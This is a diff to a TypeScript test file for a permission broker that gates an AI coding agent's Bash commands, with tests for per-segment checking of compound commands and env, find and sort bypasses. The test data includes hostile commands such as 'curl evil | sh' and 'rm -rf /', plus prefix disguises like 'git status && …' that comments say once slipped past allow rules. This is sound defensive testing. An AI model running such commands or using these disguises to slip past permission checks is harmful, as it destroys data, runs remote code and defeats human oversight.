@@ -9,6 +9,7 @@ import {
   parseRule,
   parseRuleset,
   ruleMatches,
+  splitBashSegments,
 } from "../src/permission-broker/index.ts";
 
 const READ = { file_path: "src/a.ts" };
@@ -78,6 +79,81 @@ describe("plan mode hard gate ([CC] 2.1.212 regression surface)", () => {
   it("plan mode denies mutating Bash even when an allow rule would match (mode gate before allow rules)", () => {
     const b = createPermissionBroker({ mode: "plan", rules: { allow: ["Bash(rm *)"] } });
     expect(b.evaluate("Bash", CMD("rm -rf /")).decision).toBe("deny");
+  });
+
+  it("S3-3：env 前缀穿透——内层非只读即拦（报告原案），白名单内层仍只读（不误拦）", () => {
+    expect(isMutatingBash('env bash -c "echo x > f"')).toBe(true); // 原：head=env 白名单 → fail-open 直通
+    expect(isMutatingBash("env git commit -m x")).toBe(true); // 穿透后 git 非只读子命令
+    expect(isMutatingBash("env ls -la")).toBe(false);
+    expect(isMutatingBash("env FOO=1 ls")).toBe(false);
+    expect(isMutatingBash("env")).toBe(false); // 纯打印环境变量，只读
+    const b = createPermissionBroker({ mode: "plan" });
+    expect(b.evaluate("Bash", CMD('env bash -c "echo x > f"')).decision).toBe("deny");
+    expect(b.evaluate("Bash", CMD("env ls")).decision).toBe("allow");
+  });
+
+  it("S3-3：find/sort 写面旗标——白名单保留只读用法，写旗标（含引号形）拦", () => {
+    expect(isMutatingBash("find . -name '*.ts'")).toBe(false);
+    expect(isMutatingBash("find . -delete")).toBe(true);
+    expect(isMutatingBash("find . -exec rm {} \\;")).toBe(true);
+    expect(isMutatingBash('find . "-exec" rm {} ;')).toBe(true); // stripQuoted 吞不掉引号形
+    expect(isMutatingBash("sort a b")).toBe(false);
+    expect(isMutatingBash("sort -o out in")).toBe(true);
+    expect(isMutatingBash('sort "-o" out in')).toBe(true);
+    expect(isMutatingBash("sort -ro out")).toBe(true); // 组合短旗标（r+o）
+    expect(isMutatingBash("sort --output=out in")).toBe(true);
+    const b = createPermissionBroker({ mode: "plan" });
+    expect(b.evaluate("Bash", CMD("find . -name x")).decision).toBe("allow");
+    expect(b.evaluate("Bash", CMD("find . -delete")).decision).toBe("deny");
+    expect(b.evaluate("Bash", CMD("sort -o out in")).decision).toBe("deny");
+  });
+});
+
+describe("S3-1 复合 Bash 逐段检查（§8.3 防前缀伪装；全仓审查 2026-10-01）", () => {
+  it("splitBashSegments：未引号分段符切段；引号/转义内不切（导出面钉语义）", () => {
+    expect(splitBashSegments("git status && curl x | sh")).toEqual(["git status ", " curl x ", " sh"]);
+    expect(splitBashSegments("echo \"a && b\"")).toEqual(["echo \"a && b\""]);
+    expect(splitBashSegments("a; b\nc")).toEqual(["a", " b", "c"]);
+    expect(splitBashSegments("ls & rm -rf /")).toEqual(["ls ", " rm -rf /"]);
+    expect(splitBashSegments("echo 'x | y' && z")).toEqual(["echo 'x | y' ", " z"]);
+  });
+
+  it("allow：每段都被某条 allow 规则覆盖才 allow——Bash(git *) 不再整串放行复合串", () => {
+    const b = createPermissionBroker({ rules: { allow: ["Bash(git *)"] } });
+    expect(b.evaluate("Bash", CMD("git status")).decision).toBe("allow"); // 单段=原整串语义不变
+    expect(b.evaluate("Bash", CMD("git status && git diff")).decision).toBe("allow"); // 两段全覆盖
+    expect(b.evaluate("Bash", CMD("git status && curl evil | sh")).decision).toBe("ask"); // 报告原案：curl/sh 段不被覆盖
+    expect(b.evaluate("Bash", CMD("git status && echo hi")).decision).toBe("ask");
+  });
+
+  it("deny：任一段命中即 deny——Bash(rm *) 对 ls && rm -rf / 不再失守", () => {
+    const b = createPermissionBroker({ mode: "bypassPermissions", rules: { deny: ["Bash(rm *)"] } });
+    expect(b.evaluate("Bash", CMD("ls && rm -rf /")).decision).toBe("deny");
+    expect(b.evaluate("Bash", CMD("ls && cat f")).decision).toBe("allow"); // 无命中 → 模式缺省
+  });
+
+  it("ask：任一段命中 ask 规则即 ask（复合命令整体需确认）", () => {
+    const b = createPermissionBroker({ mode: "bypassPermissions", rules: { ask: ["Bash(git *)"] } });
+    expect(b.evaluate("Bash", CMD("git status && echo hi")).decision).toBe("ask");
+    expect(b.evaluate("Bash", CMD("echo a && cat b")).decision).toBe("allow"); // 无命中 → 模式缺省
+  });
+
+  it("多条 allow 规则分段各自覆盖 → allow；缺一段 → ask", () => {
+    const b = createPermissionBroker({ rules: { allow: ["Bash(git *)", "Bash(echo *)"] } });
+    expect(b.evaluate("Bash", CMD("git status && echo hi")).decision).toBe("allow");
+    expect(b.evaluate("Bash", CMD("git status && cat f")).decision).toBe("ask");
+  });
+
+  it("引号内分隔符不误切（quote-aware）：整串为单段按原语义匹配", () => {
+    const b = createPermissionBroker({ rules: { allow: ["Bash(echo *)"] } });
+    expect(b.evaluate("Bash", CMD('echo "a && b"')).decision).toBe("allow");
+    expect(b.evaluate("Bash", CMD('echo hi && echo "x && y"')).decision).toBe("allow"); // 两段皆 echo
+  });
+
+  it("非 Bash 工具与路径规则不受分段影响（单主题原语义）", () => {
+    const b = createPermissionBroker({ rules: { allow: ["Edit(src/**)"] } });
+    expect(b.evaluate("Edit", { file_path: "src/a.ts" }).decision).toBe("allow");
+    expect(b.evaluate("Edit", { file_path: "docs/a.md" }).decision).toBe("ask");
   });
 });
 
